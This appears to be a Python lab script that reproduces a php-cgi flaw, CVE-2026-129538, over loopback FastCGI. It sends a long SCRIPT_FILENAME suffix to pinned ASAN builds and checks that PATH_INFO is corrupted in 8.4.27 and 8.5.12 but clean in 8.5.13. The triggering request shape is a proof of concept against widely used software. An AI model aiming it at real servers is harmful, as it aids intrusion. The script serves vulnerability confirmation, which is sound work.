#!/usr/bin/env python3
"""CVE-2026-129538 via loopback FastCGI request params (has_env=1 path).

Starts each pinned php-cgi as a FastCGI responder bound to 127.0.0.1 and sends
the vendor long-suffix shape as FCGI_PARAMS using the committed minimal client.
Unlike the process-environment replay, PATH_INFO and SCRIPT_FILENAME arrive as
request parameters here. No external web server is involved.

Usage: python3 lab/repro/php2shell-cve129538-fcgi.py [OUTDIR]
"""
import os
import pathlib
import signal
import socket
import subprocess
import sys
import tempfile
import time

ROOT = pathlib.Path(__file__).resolve().parents[1]
CLIENT = ROOT / 'repro/php2shell-fpm-client.py'
BUILD = ROOT / 'build'
BUILDS = (
    ('8.4.27-asan', BUILD / 'php-8.4.27-asan/sapi/cgi/php-cgi'),
    ('8.5.12-asan', BUILD / 'php-8.5.12-asan/sapi/cgi/php-cgi'),
    ('8.5.13-asan', BUILD / 'php-8.5.13-asan/sapi/cgi/php-cgi'),
)
TARGET_PHP = ('<?php var_dump($_SERVER["PATH_INFO"] ?? null, '
              '$_SERVER["ORIG_PATH_INFO"] ?? null);')


def wait_port(port, timeout=10):
    end = time.time() + timeout
    while time.time() < end:
        try:
            with socket.create_connection(('127.0.0.1', port), timeout=0.2):
                return True
        except OSError:
            time.sleep(0.1)
    return False


def request(port, target, suffix, log):
    params = {
        'REQUEST_METHOD': 'GET',
        'REDIRECT_STATUS': '1',
        'SCRIPT_FILENAME': str(target) + suffix,
        'PATH_INFO': '/x',
    }
    cmd = [sys.executable, str(CLIENT), str(port), str(target)]
    for k, v in params.items():
        cmd += ['--param', '%s=%s' % (k, v)]
    cp = subprocess.run(cmd, capture_output=True, timeout=40)
    body = cp.stdout.decode(errors='replace').split('\r\n\r\n', 1)[-1]
    lines = [x.strip().split(' ', 1)[-1]
             for x in body.strip().splitlines() if x.strip()]
    log.write('  rc=%d PATH_INFO=%s ORIG=%s\n' %
              (cp.returncode, lines[0] if lines else 'MISSING',
               lines[1] if len(lines) > 1 else 'MISSING'))
    return lines


def main():
    out = pathlib.Path(sys.argv[1] if len(sys.argv) > 1 else
                       'lab/build/evidence/cve129538-fcgi')
    out.mkdir(parents=True, exist_ok=True)
    tmp = pathlib.Path(tempfile.mkdtemp(prefix='cve129538-fcgi-'))
    target = tmp / 'target.php'
    target.write_text(TARGET_PHP)
    verdict = {}
    try:
        with (out / 'verdict.txt').open('w') as log:
            for i, (tag, binary) in enumerate(BUILDS):
                port = 18941 + i
                log.write('=== %s: %s ===\n' % (tag, binary))
                env = dict(os.environ)
                env['ASAN_OPTIONS'] = 'detect_leaks=0:abort_on_error=1'
                with (out / ('%s.log' % tag)).open('wb') as server_log:
                    gp = subprocess.Popen(
                        [str(binary), '-n', '-b', '127.0.0.1:%d' % port,
                         '-d', 'cgi.fix_pathinfo=1'],
                        env=env, stdout=server_log, stderr=subprocess.STDOUT,
                        start_new_session=True)
                    try:
                        if not wait_port(port):
                            log.write('  no listener\n')
                            verdict[tag] = None
                            continue
                        log.write('  short suffix:\n')
                        request(port, target, '/b', log)
                        log.write('  long suffix:\n')
                        fields = request(port, target, '/' + 'x' * 16, log)
                        verdict[tag] = fields[0] if fields else 'MISSING'
                    finally:
                        os.killpg(gp.pid, signal.SIGTERM)
                        try:
                            gp.wait(timeout=5)
                        except subprocess.TimeoutExpired:
                            os.killpg(gp.pid, signal.SIGKILL)
                            gp.wait()
                server_text = (out / ('%s.log' % tag)).read_text(errors='replace')
                if 'ERROR: AddressSanitizer' in server_text:
                    log.write('  ASAN in server log (not expected here)\n')
            checks = {
                '8.4.27 corrupted via FCGI_PARAMS':
                    verdict['8.4.27-asan'] not in (None, '"/x"'),
                '8.5.12 corrupted via FCGI_PARAMS':
                    verdict['8.5.12-asan'] not in (None, '"/x"'),
                '8.5.13 clean via FCGI_PARAMS':
                    verdict['8.5.13-asan'] == '"/x"',
            }
            for name, ok in checks.items():
                log.write('%-40s %s\n' % (name, 'PASS' if ok else 'FAIL'))
            log.write('VERDICT: %s\n' %
                      ('CONFIRMED' if all(checks.values()) else 'INCONCLUSIVE'))
        print((out / 'verdict.txt').read_text())
    finally:
        import shutil
        shutil.rmtree(tmp, ignore_errors=True)


if __name__ == '__main__':
    main()
